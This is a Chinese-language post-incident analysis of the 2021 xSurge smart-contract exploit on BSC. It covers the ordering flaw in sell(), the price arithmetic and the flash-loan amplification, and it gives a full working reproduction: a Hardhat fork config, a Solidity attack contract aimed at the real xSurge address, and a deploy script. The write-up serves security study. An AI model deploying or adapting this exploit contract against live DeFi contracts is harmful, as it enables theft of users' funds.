# 智能合约经典漏洞案例，xSurge 重入漏洞+套利 综合运用

# 1. 事件介绍

xSurge 被攻击事件发生在 2021-08-16 日，距离今天已经近 1 年了，为什么还会选择这个事件进行分析？主要是这个攻击过程很有意思，有以下的几点思考

- 使用 nonReentrant 防止重入，又在代码中又不遵循检查-生效-交互模式(checks-effects-interactions)时，要怎么利用？
- 该漏洞利用的代码是重入漏洞的典型代码，但利用过程却不是重入。应该是”最像重入漏洞的套利漏洞”。
- 随着 ERC20 合约的规范化，ERC20 的合约漏洞越来越少。xSurge 会不会是 ERC20 合约最后的漏洞？
- 价格计算机制既然可以从数学上证明存在漏洞，能不能用数学的方法来挖掘此类的漏洞？
- 该攻击过程中与闪电贷的完美结合。所有的攻击成本只有 gas 费，漏洞利用的大资金从闪电贷中获得，攻击获利后归还闪电贷的本息。闪电贷使攻击的收益损失比大大大大地提高。

xSurge 是一个基于 bsc 链的 Defi 的生态系统，其代币为 xSurgeToken，用户可以通过持有 xSurgeToken 获得高收益回报，同时可以将 xSurgeToken 用于其 Defi 生态中的。xSurgeToken 遵循 ERC20 协议，初始供应量为 10 亿枚，随着用户的对 xSurgeToken 的转入转出，xSurgeToken 的价格会动态进行调整。
在 2021-08-16 日，黑客通过 xSurgeToken 合约代码中的漏洞，窃取了 xSurgeToken 合约中的 12161 个 BNB。具体来说黑客采用闪电贷出的 10000 WBNB 做为初始资金，通过代码漏洞套利，淘空了 xSurgeToken 合约的 BNB 余额，同时套利使 xSurgeToken 的价格下降了 7 千多倍。
本文将重点分析和复现 xSurge 的攻击过程。

# 2. 漏洞分析

漏洞可以被利用主要在于两点：

1. sell 函数中先转了 xSurge 代币，后进行了余额的减操作，导致余额会在短暂时间内留存，这笔余额被黑客用来再次购买了 xSurge。
2. xSurge 的价格计算过程中，在有更多的买入时，会导致 xSurge 的价格变低，xSurge 的价格变低，又会导致可以购买更多的 xSurge，类似于滚雪球，越滚越大，最终把 xSurge 合约掏空。同时，叠加黑客利用闪电贷，贷到 10000 个 WBNB 进行攻击，这么大一笔钱对 xSurge 价格影响更大，从而导致循环调用 8 次就可以掏空 xSurge 合约。

对这前两点进行分析说明

## 2.1 漏洞代码分析

漏洞代码链接如下：
[https://bscscan.com/address/0xe1e1aa58983f6b8ee8e4ecd206cea6578f036c21#code](https://bscscan.com/address/0xe1e1aa58983f6b8ee8e4ecd206cea6578f036c21#code)
漏洞涉及到三个函数，：

1. **sell()**：卖出 xSurge，把卖出得到的 BNB 发送给出售者(也就是函数调用者)
2. **purchase()**：买入指定数量的 xSurge。该函数为 internal 类型，只能由下面的 recive()函数调用。
3. **receive()**:receive 不是普通函数，是 solidity 的回调函数。当 xSurge 合约收到 BNB 时，该函数会自动执行，在该函数中调用了 purchase()函数。

漏洞点在于：sell()函数中调用了 call 函数后才进行 balance 的减法操作，攻击者通过 call 函数获得代码控制权后，在 balance 还没减掉的情况下，攻击者调用 purchase 方法进行购买，达到了类似套利的效果。
众所周知，“更高成本带来更高的收益”，黑客看到这种机会，也期望着有更多的投入来套取更大的收益，于是，攻击者为了扩大这种攻击效果，使用了闪电贷，从 Pancake 中贷出来 10000 个 BNB 进行攻击，在一个区块中经过 8 次的“套利”，获得了 12161 个 BNB。
![](https://cdn.nlark.com/yuque/0/2023/png/97322/1694921183563-41a68e80-aef7-4be3-b72d-613c5308c8ff.png#averageHue=%23fefdfd&clientId=u4602e5ac-cb58-4&from=paste&id=uecb9a4de&originHeight=744&originWidth=2780&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u0d7c7790-aaf0-4f22-8ce2-7a91c37427a&title=)
在代码中，看到攻击利用的关键点

```
/** Purchases SURGE Tokens and Deposits Them in Sender's Address*/
// 利用关键点3：这里调用了mint时，balance还是没有减之前的，所以mint出来的肯定会多一些。
    function purchase(address buyer, uint256 bnbAmount) internal returns (bool) {
        // make sure we don't buy more than the bnb in this contract
        require(bnbAmount <= address(this).balance, 'purchase not included in balance');
        // previous amount of BNB before we received any
        uint256 prevBNBAmount = (address(this).balance).sub(bnbAmount);
        // if this is the first purchase, use current balance
        prevBNBAmount = prevBNBAmount == 0 ? address(this).balance : prevBNBAmount;
        // find the number of tokens we should mint to keep up with the current price
        uint256 nShouldPurchase = hyperInflatePrice ? _totalSupply.mul(bnbAmount).div(address(this).balance) : _totalSupply.mul(bnbAmount).div(prevBNBAmount);
        // apply our spread to tokens to inflate price relative to total supply
        uint256 tokensToSend = nShouldPurchase.mul(spreadDivisor).div(10**2);
        // revert if under 1
        if (tokensToSend < 1) {
            revert('Must Buy More Than One Surge');
        }

        // mint the tokens we need to the buyer
        mint(buyer, tokensToSend);  **// 到这里就成功了。**
        emit Transfer(address(this), buyer, tokensToSend);
        return true;
    }

    /** Sells SURGE Tokens And Deposits the BNB into Seller's Address */
    function sell(uint256 tokenAmount) public nonReentrant returns (bool) {

        address seller = msg.sender;

        // make sure seller has this balance
        require(_balances[seller] >= tokenAmount, 'cannot sell above token amount');

        // calculate the sell fee from this transaction
        uint256 tokensToSwap = tokenAmount.mul(sellFee).div(10**2);

        // how much BNB are these tokens worth?
        uint256 amountBNB = tokensToSwap.mul(calculatePrice());

        // 利用关键点1：漏洞地方，在call中程序的控制权被转移到攻击者手里。但是在攻击balance的数量却还没有少
        (bool successful,) = payable(seller).call{value: amountBNB, gas: 40000}("");
        if (successful) {
            // subtract full amount from sender，在这里才开始减掉balance的数量
            _balances[seller] = _balances[seller].sub(tokenAmount, 'sender does not have this amount to sell');
            // if successful, remove tokens from supply
            _totalSupply = _totalSupply.sub(tokenAmount);
        } else {
            revert();
        }
        emit Transfer(seller, address(this), tokenAmount);
        return true;
    }

// 利用关键点2：攻击合约得到程序控制权后，直接向xsurge合约进行转账，从而触发xsurge合约的receive函数的调用。这里会调用purchase函数
receive() external payable {
        uint256 val = msg.value;
        address buyer = msg.sender;
        purchase(buyer, val);
    }
```

## 2.2 xSurgeToken 价格计算方式＋闪电贷

从 xSurge 的合约代码可知，xSurgeToken 的基础数量为 10 亿，在 sell 时，\_totalSupply 会减，在 purchase 时，\_totalSupply 会增加。产生的影响是:黑客买入更多的 xSurgeToken 时,xSurgeToken 的价格会降低。
xSurge 的价格计算方法如下：xSurge 合约.balance/\_totalSupply

```
// 计算xsurge的价格，xsurge价格=this.balance/_totalSupply
    function calculatePrice() public view returns (uint256) {
        return ((address(this).balance).div(_totalSupply));
    }
```

可以把复现过程中，xSurge 的价格，xSurge 合约的 BNB 余额(下面 quantity 的值)，xSurge 的供应量打印出来(下面\_totalSupply 的值)。

```
2 times sell
cur price:40431697 = quantity(23614362876275166045082) / _totalSupply(584055694626796)

[recevie ]AttackContract xsurge balance:290602026064411, BNB balance
 11044561081497012206562
3 times sell
cur price:30436844 = quantity(23614362876275166045082) / _totalSupply(775847945216500)

[recevie ]AttackContract xsurge balance:482394273111949, BNB balance
 13801605682969677247808
4 times sell
cur price:17900419 = quantity(23614362876275166045082) / _totalSupply(1319207269744644)

[recevie ]AttackContract xsurge balance:1025753540789277, BNB balance
 17259733080609943264480
5 times sell
cur price:6449277 = quantity(23614362876275166045082) / _totalSupply(3661551965635088)
…………
```

在整个攻击过程中，从 xSurge 合约的角度看，xSurge 合约中的 BNB 没有变化(一直都是 23614362876275166045082)，但 xSurge 供应量*totalSupply 一直在增加，xSurge 的价格一路走低。(注意这句话中三个变量的顺序，这也是黑客攻击过程中的各个变量的变化趋势:xSurge 合约中的 BNB→xSurge 供应量\_totalSupply→xSurge 的价格)。
从 sell 方法中，输入的是 xSurgeToken，输出的是 BNB，计算 BNB 的公式如下：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/97322/1694921224970-acba3e44-a826-4590-ad4a-d6c404b31cab.png#averageHue=%23e8e8e8&clientId=u4602e5ac-cb58-4&from=paste&height=32&id=ua575b54e&originHeight=64&originWidth=898&originalType=binary&ratio=2&rotation=0&showTitle=false&size=17731&status=done&style=none&taskId=u55004f07-a575-408e-961a-3553d7733c5&title=&width=449)
在 purchase 方法中，输入的是 BNB，输出的是 xSurgeToken，计算 xSurgeToken 的公式如下：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/97322/1694921240164-7fd43e77-6166-44e4-980c-1e5ac5a660a0.png#averageHue=%23ececec&clientId=u4602e5ac-cb58-4&from=paste&height=40&id=u270458c0&originHeight=80&originWidth=932&originalType=binary&ratio=2&rotation=0&showTitle=false&size=17700&status=done&style=none&taskId=ud0cef0aa-9ea2-4b7c-92ac-68319fa9bb1&title=&width=466)
转化成
![image.png](https://cdn.nlark.com/yuque/0/2023/png/97322/1694921250738-42f7cd2a-27ec-458a-a66b-322f1097e2a8.png#averageHue=%23ededed&clientId=u4602e5ac-cb58-4&from=paste&height=42&id=ubf96ac3c&originHeight=84&originWidth=1094&originalType=binary&ratio=2&rotation=0&showTitle=false&size=21063&status=done&style=none&taskId=u6b76c824-c3d8-40e9-b443-e3d6b6dc305&title=&width=547)
在这个 sell 方法 purchase 方法调用过程中，实现套利，sell 得到的 bnb(也就是公式 1)需要大于 purchase 时输入的 bnb(也就是公式 2)，所以公式 1 的右边>公式 2 的右边，得到下面的不等式.
(0.94 * balance * xSurge) / totalSupply>(xSurge*balance)/(0.94*totalSupply+xSurge)$$(0.94 * balance * xSurge) / totalSupply
计算得出
![image.png](https://cdn.nlark.com/yuque/0/2023/png/97322/1694921266810-b983f127-d725-41f3-a4b4-1df1b22ce49a.png#averageHue=%23eeeeee&clientId=u4602e5ac-cb58-4&from=paste&height=46&id=u7ffed769&originHeight=92&originWidth=1224&originalType=binary&ratio=2&rotation=0&showTitle=false&size=24368&status=done&style=none&taskId=u868e804f-7f2b-469a-827f-fde7f7c79e5&title=&width=612)
也就是，当购买 xSurgeToken 投入的资本量大于 0.1238*totalSupply 时，可以实现套利。
我们打印出黑客攻击时的 xSurgeToken 的价格和 totalSupply，分别为 46393569， 293453665448225
需要投入的最少的 xSurge 数量为：0.1238*293453665448225 = 36329563782490.255。
所以攻击所需要的最低成本大约为:数量*价格=36329563782490.255_46393569 = 1685.4e18 = 1685 个 BNB。如果攻击时，使用少于 1685 个 BNB 的话，会导致入不敷出。
我们通过使用 1000 个 BNB 进行攻击来模拟下入不敷出的场景，在这种场景下，**xSurge 的价格会越来越高(如下图)**，最终导致连 1000 个 BNB 的本金都会亏损(在调用 11 次 sell 后，1000 个 BNB 只会剩下 426 个)。
![](https://cdn.nlark.com/yuque/0/2023/png/97322/1694921183595-a5c883cf-3e8f-4b8f-b144-a715c9eb9bfd.png#averageHue=%232d2b2b&clientId=u4602e5ac-cb58-4&from=paste&id=ua7f3162c&originHeight=778&originWidth=1604&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uaf9e3a91-98ed-4b1d-a4f8-c6eb7ef8f59&title=)
攻击者因此采用了闪电贷的方式获得 10000 个 BNB 到 xSurge 合约后进行攻击，换出一大笔 xSurgeToken，在 xSurge 合约 sell 中代币余额没有减的漏洞，在调用 xSurge 的 purchase 时，\_totalSupply 会增大，导致价格减少，循环下去，\_totalSupply 越来越大，xSurge 价格越来越小。
价格越来越小，就导致在这 10000 个 BNB 的本钱下，可换出来的 xSurge 越来越多。

# 3.攻击过程分析

根据交易的 tx: 0x7e2a6ec08464e8e0118368cb933dc64ed9ce36445ecf9c49cacb970ea78531d2 ，可以看到黑客通过部署了攻击合约，并调用攻击合约进行攻击，在攻击合约中使用了 Pancake 的闪电贷功能，所有的攻击过程都在 PancakePair.swap 的闪电贷方法中进行。
![](https://cdn.nlark.com/yuque/0/2023/png/97322/1694921183591-a51ed0ee-6bf8-4f50-9a09-3f1d50eac0a8.png#averageHue=%23f4f0dd&clientId=u4602e5ac-cb58-4&from=paste&id=u7f363816&originHeight=708&originWidth=3646&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u751fb556-a064-48a5-96c2-57b5e75e439&title=)
在闪电贷中，通过查看调用 swap 方法时的参数,其中的 data 数据就是闪电货的回调函数，攻击合约贷出来的币会在该回调函数中进行套利使用。
![](https://cdn.nlark.com/yuque/0/2023/png/97322/1694921183607-49415e07-3949-4bec-b510-977c32bb0969.png#averageHue=%23e7f2de&clientId=u4602e5ac-cb58-4&from=paste&id=u180f2f34&originHeight=758&originWidth=3092&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ua974ec20-71e6-4e28-99c6-a04c1547949&title=)
重点看下闪电贷中的回调函数操作：
主要操作如下：

1. 将闪电贷中贷出来的 10000 BNB 转移至攻击合约中。做为攻击时套利时的本钱。
2. 开始利用漏洞套利。
   1. 计算当前 xSurge 的价格。
   2. 攻击合约将所有的 BNB 买入 xSurge。(买入了 202,610,205,836,752 xSurge)
   3. 攻击合约调用 xSurge 的 sell 方法，将 xSurge 卖掉，同时得到 BNB(得到了 9066.40333453581 BNB， 🥵 到此黑客还是赔本的，因为贷出的 10000 个 BNB 现在变成了 9066 个…..)。此时攻击合约得到了 BNB,但攻击合约中的 xsurge 的数量还是没有减掉的。sell 方法中的 call 函数会把程序的控制权转换到攻击合约的 fallback 中。
   4. 攻击合约的 fallback 函数中。1.计算下当前拥有的 xSurge 的余额。2.将 c 中得到的 BNB 再转给 xSurge 合约，购买 xSurge。(此时的 xsurge 数量为 290,629,974,679,289,与 b 中的 xsurge 数量相比 202,610,205,836,752 ，已经多出来很多了…..)

![](https://cdn.nlark.com/yuque/0/2023/png/97322/1694921183567-bb68733b-18a8-447c-a7a8-34579ebdd796.png#averageHue=%23dbeac5&clientId=u4602e5ac-cb58-4&from=paste&id=u62daae5f&originHeight=1786&originWidth=3088&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u39c09243-46dc-495f-b909-97b5873a587&title=)

1. 重复上面 2 中的漏洞利用过程，就导致攻击合约所拥有的 xSurge 数量滚雪球一样的越来越多。(如第二次重复时，BNB 从 9066 变成 11044BNB，对应的 xSurge 从 290,629,974,679,289 增长到 482,532,660,156,157)，到第三次重复时，BNB 的数量就达到 13802，第四次重复到了 17260，…………，到第 8 次，BNB 到了 22191 后，阿祖开始收手了…
2. 还闪电贷的利息。连本带利还了 10030 BNB(攻击完成后共有 22191 BNB),净到手 12161 BNB。

![](https://cdn.nlark.com/yuque/0/2023/png/97322/1694921183991-ee71b851-b665-457c-91c6-c2ce4806dc73.png#averageHue=%23f4f3e5&clientId=u4602e5ac-cb58-4&from=paste&id=u97345171&originHeight=1364&originWidth=2970&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u1249880f-bddd-468c-ba5f-d53f4d3cfdd&title=)
可以看下这 8 次的操作时，账户金额的变化，从最初的闪电贷贷出的初始 10000 BNB 做为黑客的“创业资本”，黑客的 BNB 的数量越来多。同时，xSurge 的价格也越来越低，这是由黑客的套利行为引起的 xSurge 的价格变化。

| 次数 | xSurge 的价格 | 初始买入 xSurge 的数量    | sell 后得到的 BNB 数量 | 调用 receive 后得到的 xSurge 数量 |
| ---- | ------------- | ------------------------- | ---------------------- | --------------------------------- |
| 1    | 46,394,503    | 202,610,205,836,752       | 9066                   | 290,629,974,679,289               |
| 2    | 40,429,226    | 290,629,974,679,289       | 11044                  | 482,532,660,156,157               |
| 3    | 30,429,743    | 482,532,660,156,157       | 13802                  | 1,026,387,665,528,484             |
| 4    | 17,889,900    | 1,026,387,665,528,484     | 17260                  | 3,372,122,831,057,924             |
| 5    | 6,441,197     | 3,372,122,831,057,924     | 20417                  | 22,033,618,137,782,256            |
| 6    | 1,057,468     | 22,033,618,137,782,256    | 21901                  | 269,089,469,621,295,418           |
| 7    | 87,645        | 269,089,469,621,295,418   | 22169                  | 3,896,288,852,239,436,433         |
| 8    | 6,059         | 3,896,288,852,239,436,433 | 22191                  |                                   |

# 4. 攻击复现

攻击复现时在 fork 对应的区块时，不要使用 morails，morails 的加速节点有问题，无法 fork 成功。alchemy 又不支持 bsc 链，这里使用了 quicknode 进行区块 fork 。
另外黑客攻击发生在 10087724 区块高度，使用 quicknode 从 10087723fork 后，得到的 xSurge 的价格与黑客攻击时稍微的不同，猜测可能是由于对应的区块中也有对 xSurgeToken 的调用导致 xSurge 的价格产生了稍微的变化。
攻击复现的效果图如下：
![](https://cdn.nlark.com/yuque/0/2023/png/97322/1694921184040-3c6169d4-53a6-4694-9f3c-299f12bf18be.png#averageHue=%23322e2d&clientId=u4602e5ac-cb58-4&from=paste&id=uda0d8379&originHeight=1430&originWidth=2236&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u1adf36a0-5810-4147-b14f-bd78fa8cb6b&title=)

## 4.1 harhat.config.ts 配置文件

```
import { HardhatUserConfig } from "hardhat/config";
import "@nomicfoundation/hardhat-toolbox";

const config: HardhatUserConfig = {
  solidity: {
    version: "0.8.8",
    settings: {
      optimizer: {
        enabled: true,
        runs: 200,
      },
    },
  },
  networks: {
    hardhat: {
      forking: {
        // url: "https://speedy-nodes-nyc.moralis.io/*******/bsc/mainnet/archive",
        // url: "https://eth-mainnet.alchemyapi.io/v2/*******",
        url: "https://falling-wandering-river.bsc.discover.quiknode.pro/*******/",
        // 	10087724  19381696
        blockNumber: 10087723,
      },
      loggingEnabled: false,
      gas: 20_000_000,
    }
  }
};

export default config;
```

使用 hardhat 进行攻击复现。攻击复现代码如下，使用的复现命令为

```
npx hardhat run scripts/deploy.ts --network hardhat
```

## 4.2 attack.sol

攻击合约。
攻击合约中有定义 maxSellNumber 状态变量，用来指定调用 sell 方法的次数。可以通过修改这个状态变量的值，来观察不同的区块高度上的 xSurgeToken 状态下，最优的 sell 次数。
攻击合约中有几点注意事项：

1. 在攻击合约的 receive()回调中，通过 maxSellNumber 控制最后一次**不要执行**“向 xSurge 转入 BNB，再次买入 xSurge”的操作(如果每次都执行这个操作，最终的资金全部在 xSurge 中，最终会把所有的资金锁死)。
2. 攻击流程如下：
   1. 闪电贷 10000 个 WBNB，将 10000 个 WBNB 换成 10000 个原生代币 BNB
   2. 使用 10000 个 BNB 购买 xSurgeToken
   3. 调用 xSurge.sell，触发漏洞。同时在攻击合约的 fallback 中再次买入 xSurge 的操作。
   4. 重复 c 中的操作方法 maxSellNumber-1 次
   5. 调用 xSurge.sell,此时攻击合约的 fallback 中不再买入 xSurge，此时攻击合约会得到 BNB
   6. 攻击合约将得到的 BNB，转换成 WBNB 后，归还闪电贷后剩下的 WBNB 就是黑客攻击所得。

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./interfaces/Uniswap.sol";
import "hardhat/console.sol";
import "./IXsurge.sol";
import "./interfaces/IWBNB.sol";
interface IPancakeCallee {
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;
}
contract Attack is IPancakeCallee, Ownable{
    address private constant UniswapV2Factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private constant PancakeToken= 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    address private constant PancakeFactory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private constant PanckaePair = 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0;
    address private constant surgeTokenAddr = 0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21;

    uint256 curSellNumber = 0;
    uint256 constant maxSellNumber = 8;
    constructor(){

    }
    fallback() external {}
    receive() payable external {
        if(msg.sender==surgeTokenAddr && curSellNumber<=maxSellNumber-1){
            console.log("[recevie()]AttackContract xsurge balance:%s, BNB balance:%s",
                        ISurgeToken(payable(surgeTokenAddr)).balanceOf(address(this)),
                        address(this).balance);
            uint256 hackContractXsurge = IERC20(surgeTokenAddr).balanceOf(address(this));
            payable(surgeTokenAddr).call{value:address(this).balance}(""); // 向xSurge转入BNB，再次买入xSurge
        }
    }

    function  startAttack(address _tokenBorrow, uint256 _amount) public onlyOwner {

        address pair = IUniswapV2Factory(PancakeFactory).getPair(_tokenBorrow, PancakeToken);
        require(pair!=address(0), "the pair _tokenBorrow is not exist...");
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint256 amount0Out = _tokenBorrow==token0 ? _amount : 0;
        uint256 amount1Out = _tokenBorrow== token1 ? _amount : 0;
        bytes memory data = abi.encode(_tokenBorrow, _amount);
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function pancakeCall(address _sender, uint amount0, uint amount1, bytes calldata _data) external override{
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        // call uniswapv2factory to getpair
        address pair = IUniswapV2Factory(PancakeFactory).getPair(token0, token1);
        require(msg.sender == pair, "!pair");
        // check sender holds the address who initiated the flash loans
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));
        uint256 price = ISurgeToken(payable(surgeTokenAddr)).calculatePrice();
        // console.log("price:", price); //46394463

        console.log("Attack WBNB blance:%s, xsurge balance:%s, balance:%s",
                    IERC20(WBNB).balanceOf(address(this)),
                    IERC20(surgeTokenAddr).balanceOf(address(this)),
                    address(this).balance);
        // 将从闪电贷中得到的10000 WBNB转化成自身的 BNB
        console.log("AttackContract get %s WBNB to BNB", amount);
        IWBNB(payable(WBNB)).withdraw(amount);
        console.log("Attack WBNB blance:%s, xsurge balance:%s, balance:%s",
                    IERC20(WBNB).balanceOf(address(this)),
                    IERC20(surgeTokenAddr).balanceOf(address(this)),
                    address(this).balance);
        // 将自身从闪电贷中的得到的WBNB，转化成BNB后，充值给xSurgerToken.
        console.log("AttackContract send %s BNB to xSurgeToken", amount);
        payable(surgeTokenAddr).call{value:amount}("");
        console.log("[Before]AttackContract WBNB blance:%s, xsurge balance:%s, balance:%s",
                    IERC20(WBNB).balanceOf(address(this)),
                    IERC20(surgeTokenAddr).balanceOf(address(this)),
                    address(this).balance);

        // 将得到的xSurge sell掉，在调用xSurge的sell方法时，sell方法的call会将程序控制权交到attackContract的receiver回调函数中。
        curSellNumber = 1;
        uint256 hackContractXsurge = IERC20(surgeTokenAddr).balanceOf(address(this));
        // console.log("hackContractXsurge count:", hackContractXsurge);
        console.log("%s times sell", curSellNumber);
        uint256 xSurgeTokenBnbQuantity = ISurgeToken(payable(surgeTokenAddr)).getBNBQuantityInContract();
        console.log("cur price:%s = quantity(%s) / _totalSupply(%s)",
                        price,
                        xSurgeTokenBnbQuantity,
                        xSurgeTokenBnbQuantity/price);
        ISurgeToken(payable(surgeTokenAddr)).sell(hackContractXsurge);

        // 将上面的方法连续调用多次。
        curSellNumber++;
        for (; curSellNumber<=maxSellNumber; curSellNumber++) {
            uint256 curPrice = ISurgeToken(payable(surgeTokenAddr)).calculatePrice();
            xSurgeTokenBnbQuantity = ISurgeToken(payable(surgeTokenAddr)).getBNBQuantityInContract();
            console.log("%s times sell",
                        curSellNumber);
            console.log("cur price:%s = quantity(%s) / _totalSupply(%s)",
                        curPrice,
                        xSurgeTokenBnbQuantity,
                        xSurgeTokenBnbQuantity/curPrice);
            hackContractXsurge = IERC20(surgeTokenAddr).balanceOf(address(this));
            //　每次sell时，控制权会来到receive函数中，在receive中向xSurgeToken转入BNB买入xSurge
            ISurgeToken(payable(surgeTokenAddr)).sell(hackContractXsurge);
        }
        console.log("[After loop]AttackContract xsurge balance:%s, BNB balance:%s",
                        ISurgeToken(payable(surgeTokenAddr)).balanceOf(address(this)),
                        address(this).balance);

        console.log("BNB-> WBNB:%s->%s",
                    address(this).balance,
                    IWBNB(payable(WBNB)).balanceOf(address(this)));
        payable(WBNB).call{value:address(this).balance}("");
        console.log("[Compelete...]BNB-> WBNB:%s->%s",
                    address(this).balance,
                    IWBNB(payable(WBNB)).balanceOf(address(this)));
        // 归还闪电贷。0.3% fees
        uint fee = ((amount * 3) / 997) + 1;
        uint amountToRepay = amount + fee;
        console.log("return %s WBNB(amountToRepay:%s) flashloan...Cur constract WBNB balance:%s\n",
                    amount/1 ether,
                    amountToRepay/1 ether,
                    IERC20(WBNB).balanceOf(address(this))/1 ether);
        IERC20(tokenBorrow).transfer(pair, amountToRepay);

        console.log("[Filnal...]AttackContract WBNB blance:%s, xsurge balance:%s, balance:%s\n",
                    IERC20(WBNB).balanceOf(address(this))/1 ether,
                    IERC20(surgeTokenAddr).balanceOf(address(this)),
                    address(this).balance);

    }
}
```

## 4.3 deploy.ts

脚本的主要功能为部署攻击合约，调用攻击合约。

```
import { ethers } from "hardhat";
import hre from "hardhat";
import "@nomicfoundation/hardhat-chai-matchers";
import { BigNumber } from "ethers";

async function main() {

  const ERC20ABI = require("@uniswap/v2-core/build/ERC20.json").abi;
  const WBNB = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
  const XSurgeTokenAddr = "0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21";

  let borrowAmount = ethers.BigNumber.from("10000000000000000000000"); // 使用10000个BNB攻击
  // let borrowAmount = ethers.BigNumber.from("2000000000000000000000"); // 2000个BNB
  // let borrowAmount = ethers.BigNumber.from("1000000000000000000000"); // 1000个BNB,可用来模拟入不敷出的场景

  // 1.部署AttackContract
  const Attack = await ethers.getContractFactory("Attack");
  var attackContract = await Attack.deploy();
  await attackContract.deployed();

  var Alice;
  [Alice] =await hre.ethers.getSigners();
  // 2.调用攻击合约的闪电贷
  const WBNBContract = new ethers.Contract(WBNB, ERC20ABI, Alice);
  const XSurgeContract = new ethers.Contract(XSurgeTokenAddr, ERC20ABI, Alice);

  console.log("[Before Attack.....]AttackContract xsurge balance:%s ether, WBNB balance:%s ether, BNB balance:%s ether\n",
              ethers.utils.formatEther(await XSurgeContract.balanceOf(attackContract.address)),
              ethers.utils.formatEther(await WBNBContract.balanceOf(attackContract.address)),
              ethers.utils.formatEther(await attackContract.provider.getBalance(attackContract.address)));

  console.log("attackContract startAttack flahloan.....");
  await attackContract.startAttack(WBNB, borrowAmount);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 4.4 复现时要注意的事项

黑客利用的区块高度为 10087724，因此复现时计划从上一区块，也就是 10087723 进行 fork。但这过程中有一些坑。

1. moralis 是我最喜欢用的，首先是因为 morails 支持的公链更多，但从 10087723 fork 时，一直指示 timestamp 的错误，导致 fork 失败。而尝试后发现，如果从最新产生的区块高度 19381696 附近进行 fork 的话，则会成功。因此，对于比较久远的区块，morails fork 时可能会出现问题。
2. 后来尝试使用 alchemy，alchemyapi 目前支持 ethereum, polygon, arbitrum, optimism 公链，暂不支持 BSC 链，因此也放弃。

![](https://cdn.nlark.com/yuque/0/2023/png/97322/1694921184092-964390b7-2932-4bea-8722-00e34cdcebc9.png#averageHue=%23e9e9e8&clientId=u4602e5ac-cb58-4&from=paste&id=uaeb7fe94&originHeight=512&originWidth=484&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ued1191ee-acd5-4594-9667-24720400dbb&title=)

1. 使用 quiknode 提供的节点功能，可以成功，但 quiknode 速度稍慢一些。

# 5.总结

## 5.1 xSurge 漏洞是一个不完全的重入漏洞

再看下漏洞存在的 sell 方法中的关键代码，sell 方法有 nonReentrant 修饰符，存在对重入攻击的防范措施，所以在 sell 函数执行完之前，攻击者是无法再次进入到 sell 函数中的。在漏洞利用中，攻击者也没有利用漏洞再次进行 sell 函数，而是利用漏洞后进入 purchase 函数。

```
function sell(uint256 tokenAmount) public nonReentrant returns (bool) {

        address seller = msg.sender;
        ……………………
        (bool successful,) = payable(seller).call{value: amountBNB, gas: 40000}("");
        if (successful) {
            _balances[seller] = _balances[seller].sub(tokenAmount, 'sender does not have this amount to sell');
            _totalSupply = _totalSupply.sub(tokenAmount);
        } else {
            revert();
        }
    }
```

本次合约代码中存在的漏洞利用与传统的重入攻击有些区别。

- 传统的重入攻击常见的场景是，合约 A 的 a 方法(a 方法调用了 call 方法,且 balance 的 sub 操作在 call 方法后)存在重入漏洞，在执行到漏洞点 call 函数时，攻击者的合约 B 得到回调函数 b 得到控制权，攻击者通过在 b 中再次调用合约 A 的 a 方法，…………,一个重入的自动循环就产生了。在这种场景下是 A 合约的 a 方法与 B 合约的 b 方法构成调用循环。
- 而此次攻击中，xSurge 合约的 sell 方法(sell 方法中调用了 call 方法)中存在重入漏洞，在执行到漏洞点 call 函数时，攻击者的合约 B 得到回调函数 b 得到控制权，攻击者通过在 b 中调用的 xSurge 合约 purchase 方法，实现效果的并不是 2 个函数之间的自动来回循环，而是两个函数实现一次套利，人工的多次调用套利操作。更像是个半自动的过程。

## 5.2 循环的利用次数要严格控制

请思考下，为什么黑客攻击是进行 8 次就中止？为什么不是 9 次或者 7 次，而是 8 次？如果真的执行 9 次会怎么样？如果执行 11 次会怎样?如果执行 12 次会怎么?
因为 xSurge 合约中的代币数量在第 8 次时收益会最大，打印出调用 sell 的次数时，对应的取出的 BNB 数量，在第 8 次时有 22192 的收益，收益最大。第 9 次时，收益只有 22187 在第 11 次时，此时 xSurge 的价格只有 2 了，收益只有 21928 了。
如果第 12 次，xSurge 里的代币价值就不够你充值的 BNB 了，会导致黑客所有的 xsurge 都取不出来，在这种情况下，黑客就会偷鸡不成反蚀米，充值充爆了 xSurgeToken，还无法从 xSurgeToken 中取出 BNB。
下表中的 cur price 表示当前次数时，xSurge 的价格;BNB balance 表示当前次数时的收益。

- 当调用 sell 方法的次数小于 8 时，价格越来越低，BNB 的收益越来越高。
- 当调用 sell 方法的次数大于 8 时，价格越来越低，BNB 的收益越来越低。

```
7 times sell, cur price:87868
[recevie ]AttackContract xsurge balance:268451834133810277, BNB balance
 22173026215969462900880
